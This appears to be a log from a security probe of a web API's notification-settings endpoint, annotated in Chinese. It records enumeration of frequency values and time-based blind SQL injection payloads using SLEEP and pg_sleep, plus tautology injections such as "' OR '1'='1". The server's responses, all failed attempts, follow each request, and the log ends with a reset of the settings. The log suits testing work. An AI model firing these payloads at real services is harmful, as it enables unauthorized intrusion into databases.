@@ -1,0 +1,53 @@
+===== r216 500悬案判决 =====
+--- F 段: 频率枚举撞击 ---
+[F_all] 500 len=73 2398ms frequencies=['all']
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+[F_daily] 500 len=73 433ms frequencies=['daily']
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+[F_weekly] 500 len=73 432ms frequencies=['weekly']
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+[F_mentions] 500 len=73 1315ms frequencies=['mentions']
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+[F_none] 500 len=73 419ms frequencies=['none']
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+[F_junk2] 500 len=73 422ms frequencies=['junk'] 复打(冷启动对照)
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+--- T 段: 时延盲注多形态 ---
+[T2] 500 len=73 1116ms ["x' OR SLEEP(4)-- "]
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+[T3] 500 len=73 1273ms ["x') OR SLEEP(4)-- "]
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+[T4] 500 len=73 1295ms ["x' OR pg_sleep(4)::text=''-- "]
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+[T5] 500 len=73 1171ms ["x') OR pg_sleep(4)::text=''-- "]
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+[T6] 500 len=73 457ms ["x',(SELECT pg_sleep(4)::text)-- "]
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+[T7] 500 len=73 1071ms ["x',(SELECT SLEEP(4))-- "]
+    body=b'{"error":true,"status":500,"message":"Internal Server Error","i18n":null}'
+--- R 段: 有数据面重打 notification_type ---
+[R1] 200 len=337 504ms 真值(基线有meta)
+    body=b'{"error":false,"status":200,"meta":{"id":"c7960c4f-a55e-4b54-8c60-54e092168327","team_id":"1666382706663462213","org_id":null,"notification_type":"new_editor_notification","frequencies":[],"recipient_settings":"specific_admins","recipients":[],"created_at":"2026-09-11T06:46:55.221Z","updated_at":"2026-09-11T06:46:55.221Z"},"i18n":null}'
+[R2] 200 len=40 378ms 'junk'(过滤判别)
+    body=b'{"error":false,"status":200,"i18n":null}'
+[R3] 200 len=40 387ms junk' OR '1'='1
+    body=b'{"error":false,"status":200,"i18n":null}'
+[R4] 200 len=40 386ms junk' OR pg_sleep(4)::text=''-- 
+    body=b'{"error":false,"status":200,"i18n":null}'
+[R5] 200 len=40 417ms 真值' AND pg_sleep(4)::text=''-- 
+    body=b'{"error":false,"status":200,"i18n":null}'
+--- E 段: recipients 宽松度 ---
+[E1] 200 len=337 426ms recipients=[真UID_A]
+    body=b'{"error":false,"status":200,"meta":{"id":"cceae0bc-f1b3-4ed3-840f-59cd04fb4ab8","team_id":"1666382706663462213","org_id":null,"notification_type":"new_editor_notification","frequencies":[],"recipient_settings":"specific_admins","recipients":[],"created_at":"2026-09-11T06:50:00.163Z","updated_at":"2026-09-11T06:50:00.163Z"},"i18n":null}'
+[E1b] 200 len=337 389ms 读回(E1后)
+    body=b'{"error":false,"status":200,"meta":{"id":"cceae0bc-f1b3-4ed3-840f-59cd04fb4ab8","team_id":"1666382706663462213","org_id":null,"notification_type":"new_editor_notification","frequencies":[],"recipient_settings":"specific_admins","recipients":[],"created_at":"2026-09-11T06:50:00.163Z","updated_at":"2026-09-11T06:50:00.163Z"},"i18n":null}'
+[E2] 200 len=337 451ms recipients=[真UID_A+']
+    body=b'{"error":false,"status":200,"meta":{"id":"f68ed30d-f737-4308-a2b2-354b4ebf5df2","team_id":"1666382706663462213","org_id":null,"notification_type":"new_editor_notification","frequencies":[],"recipient_settings":"specific_admins","recipients":[],"created_at":"2026-09-11T06:50:05.402Z","updated_at":"2026-09-11T06:50:05.402Z"},"i18n":null}'
+[E2b] 200 len=337 414ms 读回(E2后)
+    body=b'{"error":false,"status":200,"meta":{"id":"f68ed30d-f737-4308-a2b2-354b4ebf5df2","team_id":"1666382706663462213","org_id":null,"notification_type":"new_editor_notification","frequencies":[],"recipient_settings":"specific_admins","recipients":[],"created_at":"2026-09-11T06:50:05.402Z","updated_at":"2026-09-11T06:50:05.402Z"},"i18n":null}'
+--- 恢复净空 ---
+[G1] 200 len=337 486ms 恢复净空
+    body=b'{"error":false,"status":200,"meta":{"id":"1a3020c9-281c-453a-b602-79464d6dd586","team_id":"1666382706663462213","org_id":null,"notification_type":"new_editor_notification","frequencies":[],"recipient_settings":"specific_admins","recipients":[],"created_at":"2026-09-11T06:50:10.671Z","updated_at":"2026-09-11T06:50:10.671Z"},"i18n":null}'
+[G2] 200 len=337 431ms 复核净空
+    body=b'{"error":false,"status":200,"meta":{"id":"1a3020c9-281c-453a-b602-79464d6dd586","team_id":"1666382706663462213","org_id":null,"notification_type":"new_editor_notification","frequencies":[],"recipient_settings":"specific_admins","recipients":[],"created_at":"2026-09-11T06:50:10.671Z","updated_at":"2026-09-11T06:50:10.671Z"},"i18n":null}'
+DONE r216
